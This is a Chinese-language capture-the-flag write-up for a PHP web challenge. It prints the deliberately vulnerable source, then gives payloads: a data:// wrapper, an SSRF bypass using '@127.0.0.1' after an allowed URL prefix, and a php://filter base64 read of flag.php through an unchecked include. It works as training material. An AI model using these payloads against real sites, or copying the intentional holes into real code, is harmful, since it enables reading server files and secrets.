### Aura 的礼物

---

> 这个题还是比较有意思的

```php
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift);
```

#### 第一步

利用data协议：

```
pen=data://text/plain,Aura
```

#### 第二步

我们来分析一下

```php
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
```

我们要满足

- 传入值中有`http://jasmineaura.github.io`
- 满足进入页面有`已经收到Kengwang的礼物啦`

这里考到了SSRF,我们直接让他读自己的页面就ok拉

```
challenge=http://jasmineaura.github.io@127.0.0.1
```

> 当然创建一个多级域名网页，网页内容添加`已经收到Kengwang的礼物啦`也是可以的

### 第三步

```
&gift=php://filter/read=convert.base64-encode/resource=flag.php
```



总结:

```
pen=data://text/plain,Aura&challenge=http://jasmineaura.github.io@127.0.0.1&gift=php://filter/read=convert.base64-encode/resource=flag.php
```

